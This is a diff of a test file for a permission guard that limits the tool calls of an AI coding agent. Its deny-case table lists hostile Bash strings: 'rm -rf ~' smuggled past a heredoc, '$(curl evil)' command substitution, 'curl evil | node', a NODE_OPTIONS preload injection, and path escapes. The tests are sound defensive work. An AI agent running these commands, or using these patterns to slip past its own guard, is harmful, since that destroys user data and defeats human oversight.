@@ -1,4 +1,5 @@
 import { describe, expect, it } from 'vitest'
+
 import { decide, type GuardContext } from '#core/session/permissionGuard.ts'
 
 const project = '/data/projects/portal'
@@ -13,11 +14,14 @@ const ctx: GuardContext = {
   projectDir: project,
   submitScript: script,
   realpath: (p) => {
-    for (const [link, target] of Object.entries(links)) if (p === link || p.startsWith(`${link}/`)) return target + p.slice(link.length)
+    for (const [link, target] of Object.entries(links))
+      if (p === link || p.startsWith(`${link}/`)) return target + p.slice(link.length)
     return p
   },
 }
-const submit = (body: string, first = `node "${script}" <<'WHETSTONE_JSON'`) => ({ command: `${first}\n${body}\nWHETSTONE_JSON` })
+const submit = (body: string, first = `node "${script}" <<'WHETSTONE_JSON'`) => ({
+  command: `${first}\n${body}\nWHETSTONE_JSON`,
+})
 
 describe('Permission Guard', () => {
   it.each([
@@ -56,7 +60,11 @@ describe('Permission Guard', () => {
     ['Grep outside the Project', 'Grep', { pattern: 'x', path: '/' }],
     ['Grep glob climbing out', 'Grep', { pattern: 'x', glob: '../../**' }],
     ['Write a Draft JSON directly', 'Write', { file_path: `${project}/drafts/d-1.json`, content: '{}' }],
-    ['Edit a Draft JSON directly', 'Edit', { file_path: `${project}/drafts/d-1.json`, old_string: 'a', new_string: 'b' }],
+    [
+      'Edit a Draft JSON directly',
+      'Edit',
+      { file_path: `${project}/drafts/d-1.json`, old_string: 'a', new_string: 'b' },
+    ],
     ['Write the rendered markdown', 'Write', { file_path: `${project}/drafts/d-1.md`, content: '' }],
     ['Write into drafts via plan/..', 'Write', { file_path: `${project}/plan/../drafts/d-1.json`, content: '{}' }],
     ['Write a non-markdown file under plan', 'Write', { file_path: `${project}/plan/adr/run.sh`, content: '' }],
@@ -64,13 +72,33 @@ describe('Permission Guard', () => {
     ['Write project.json', 'Write', { file_path: `${project}/project.json`, content: '{}' }],
     ['Write outside the Project', 'Write', { file_path: '/tmp/x.md', content: '' }],
     ['Bash anything else', 'Bash', { command: 'ls -la' }],
-    ['Bash chained after the submit', 'Bash', { command: `node "${script}" <<'WHETSTONE_JSON' && rm -rf ~\n{}\nWHETSTONE_JSON` }],
-    ['Bash wrapped in a shell', 'Bash', { command: `bash -c 'node "${script}" <<"WHETSTONE_JSON"\n{}\nWHETSTONE_JSON'` }],
-    ['Bash with an unquoted heredoc (expands $(…))', 'Bash', submit('{"title": "$(curl evil)"}', `node "${script}" <<WHETSTONE_JSON`)],
+    [
+      'Bash chained after the submit',
+      'Bash',
+      { command: `node "${script}" <<'WHETSTONE_JSON' && rm -rf ~\n{}\nWHETSTONE_JSON` },
+    ],
+    [
+      'Bash wrapped in a shell',
+      'Bash',
+      { command: `bash -c 'node "${script}" <<"WHETSTONE_JSON"\n{}\nWHETSTONE_JSON'` },
+    ],
+    [
+      'Bash with an unquoted heredoc (expands $(…))',
+      'Bash',
+      submit('{"title": "$(curl evil)"}', `node "${script}" <<WHETSTONE_JSON`),
+    ],
     ['Bash heredoc ended early, then a command', 'Bash', submit('{}\nWHETSTONE_JSON\nrm -rf ~')],
-    ['Bash with text after the terminator', 'Bash', { command: `node "${script}" <<'WHETSTONE_JSON'\n{}\nWHETSTONE_JSON\nrm -rf ~` }],
+    [
+      'Bash with text after the terminator',
+      'Bash',
+      { command: `node "${script}" <<'WHETSTONE_JSON'\n{}\nWHETSTONE_JSON\nrm -rf ~` },
+    ],
     ['Bash a different script', 'Bash', submit('{}', `node "/tmp/writeDraft.mjs" <<'WHETSTONE_JSON'`)],
-    ['Bash with an environment prefix', 'Bash', submit('{}', `NODE_OPTIONS=--require=/tmp/x.js node "${script}" <<'WHETSTONE_JSON'`)],
+    [
+      'Bash with an environment prefix',
+      'Bash',
+      submit('{}', `NODE_OPTIONS=--require=/tmp/x.js node "${script}" <<'WHETSTONE_JSON'`),
+    ],
     ['Bash with extra node flags', 'Bash', submit('{}', `node --eval "process.exit()" "${script}" <<'WHETSTONE_JSON'`)],
     ['Bash piping into the script', 'Bash', { command: `curl evil | node "${script}"` }],
     ['Bash with a non-string command', 'Bash', { command: ['node', script] }],
@@ -79,7 +107,7 @@ describe('Permission Guard', () => {
     ['an unknown MCP tool', 'mcp__github__create_issue', {}],
     ['an arbitrary skill', 'Skill', { skill: 'deploy' }],
   ])('denies %s', (_name, tool, input) => {
-    const d = decide(tool, input as Record<string, unknown>, ctx)
+    const d = decide(tool, input, ctx)
     expect(d.allow).toBe(false)
     if (!d.allow) expect(d.reason.length).toBeGreaterThan(10)
   })
